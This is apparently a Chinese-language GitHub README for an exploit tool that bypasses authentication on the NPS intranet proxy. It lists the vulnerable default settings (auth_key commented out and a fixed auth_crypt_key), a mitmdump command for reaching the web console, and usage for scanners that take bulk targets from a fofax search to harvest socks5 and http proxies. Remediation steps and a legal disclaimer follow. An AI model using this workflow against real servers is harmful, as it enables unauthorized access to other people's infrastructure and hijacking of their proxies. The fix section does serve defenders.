# nps-auth-bypass
nps认证绕过利用工具，使用此工具可方便地访问web控制端，或者批量获取socks5和http代理

## 利用条件
默认配置 /etc/nps/conf/nps.conf:53
```
#auth_key=test
auth_crypt_key =1234567812345678
```
* `auth_key`被注释或为空
* `auth_crypt_key`为默认值`1234567812345678`


## 使用方法
### web端
```
mitmdump -s main.py -p 8000 --ssl-insecure --mode reverse:http://x.x.x.x:x/
```
浏览器访问 http://127.0.0.1:8000/


### 扫描器
> 目前稳定性有待测试，提供两种版本，代码略有区别

单线程
```
usage: scan.py [-h] [-u URL] [-l URL_LIST] [--format {txt,csv,json,mongodb}]
               [-p PROXY] [-v]

Example: python scan.py -u target_url -o txt -v
         python scan.py -l url_list -o csv -p http://127.0.0.1:1080

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL
  -l URL_LIST, --url-list URL_LIST
                        Target URL list file
  --format {txt,csv,json,mongodb}
                        Report format (Default: txt)
  -p PROXY, --proxy PROXY
                        Proxy URL, support HTTP and SOCKS proxies
                        (Example: http://localhost:8080, socks5://localhost:8088)
  -v, --verbose         Execute in verbose mode
```
多线程
```
usage: scan_multi.py [-h] [-u URL] [-l URL_LIST] [--stdin]
                     [--format {txt,csv,json,mongodb}] [-p PROXY] [-t THREAD]
                     [-v]
                     
Example: python scan_multi.py -u http://1.1.1.1:8080 -t 10
         python scan_multi.py -l targets.txt --format txt -p http://127.0.0.1:8080
         fofax -fs 1000 -ffi -q "app=\"xxx\"" | python scan_multi.py --stdin

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Target URL
  -l URL_LIST, --url-list URL_LIST
                        Target URL list file
  --stdin               Target URL list from STDIN
  --format {txt,csv,json,mongodb}
                        Report format (Default: txt)
  -p PROXY, --proxy PROXY
                        Proxy URL, support HTTP and SOCKS proxies
                        (Example: http://localhost:8080, socks5://localhost:8088)
  -t THREAD, --thread THREAD
                        Number of threads, default 10
  -v, --verbose         Execute in verbose mode
```
## 修复方式
* 修改`auth_key`为随机值

* 修改或注释`auth_crypt_key`


## 免责声明
本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。

在安装并使用本工具前，请您务必审慎阅读、充分理解各条款内容，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。
## 效果图
![](https://user-images.githubusercontent.com/62796978/182800291-29bd912b-a06d-4069-b5d5-cc6d2e6a0b5d.png)
![](https://user-images.githubusercontent.com/62796978/183109155-81b515fe-570c-484f-844b-079778f44138.png)


## 参考链接
https://github.com/shadow1ng/fscan

https://github.com/maurosoria/dirsearch
